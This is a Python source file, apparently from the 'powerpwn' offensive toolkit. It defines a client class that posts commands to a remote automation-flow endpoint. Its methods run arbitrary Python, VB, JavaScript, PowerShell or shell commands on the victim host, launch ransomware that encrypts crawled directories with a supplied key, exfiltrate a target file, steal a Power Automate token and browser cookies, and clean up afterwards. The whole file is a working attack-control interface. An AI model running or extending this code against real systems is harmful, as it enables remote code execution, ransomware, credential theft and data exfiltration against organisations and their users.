from typing import List

import requests
import json
from pydantic.error_wrappers import ValidationError
from powerpwn.models.flow_arg import *
from powerpwn.models.flow_res import FlowResults


class PowerPwn:
    def __init__(self, post_url: str):
        self.post_url = post_url

    def run_flow(self, arguments: FlowArguments) -> FlowResults:
        try:
            flow_args = json.loads(arguments.json())
        except json.JSONDecodeError:
            print(f"Bad command. Raw content: {FlowArguments}")
            raise

        resp = requests.post(
            url=self.post_url,
            json=flow_args
        )

        try:
            flow_res = FlowResults.parse_obj(resp.json())
            return flow_res
        except ValidationError:
            print(f"Bad response. Raw content: {resp.content}")
            raise

    def exec_py2(self, command: str) -> FlowResults:
        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CODE_EXEC, CodeExecCommandType=CommandTypeEnum.PYTHON, CodeExecCommand=command)
        return self.run_flow(flow_args)

    def exec_vb(self, command: str) -> FlowResults:
        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CODE_EXEC, CodeExecCommandType=CommandTypeEnum.VISUALBASIC, CodeExecCommand=command)
        return self.run_flow(flow_args)

    def exec_js(self, command: str) -> FlowResults:
        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CODE_EXEC, CodeExecCommandType=CommandTypeEnum.JAVASCRIPT, CodeExecCommand=command)
        return self.run_flow(flow_args)

    def exec_ps(self, command: str) -> FlowResults:
        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CODE_EXEC, CodeExecCommandType=CommandTypeEnum.POWERSHELL, CodeExecCommand=command)
        return self.run_flow(flow_args)

    def exec_cmd(self, command: str) -> FlowResults:
        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CODE_EXEC, CodeExecCommandType=CommandTypeEnum.COMMANDLINE, CodeExecCommand=command)
        return self.run_flow(flow_args)

    def ransomware(self, crawl_depth: str, dirs_to_init_crawl: List[str], encryption_key: str) -> FlowResults:
        dirs_to_init_crawl_str = ",".join(dirs_to_init_crawl)
        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.RANSOMWARE,
                                  RansomwareCrawlDepth=crawl_depth, RansomwareDirectoriesToInitCrawl=dirs_to_init_crawl_str, RansomwareEncryptionKey=encryption_key)
        return self.run_flow(flow_args)

    def exfil(self, target: str) -> FlowResults:
        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.EXFILTRATION, ExfilTargetFile=target)
        return self.run_flow(flow_args)

    def cleanup(self) -> FlowResults:
        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.CLEANUP)
        return self.run_flow(flow_args)

    def steal_power_automate_token(self) -> FlowResults:
        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.STEAL_POWER_AUTOMATE_TOKEN)
        return self.run_flow(flow_args)

    def steal_cookie(self, fqdn: str) -> FlowResults:
        flow_args = FlowArguments(FlowToRun=FlowToRunEnum.STEAL_COOKIE, StealCookieFQDN=fqdn)
        return self.run_flow(flow_args)
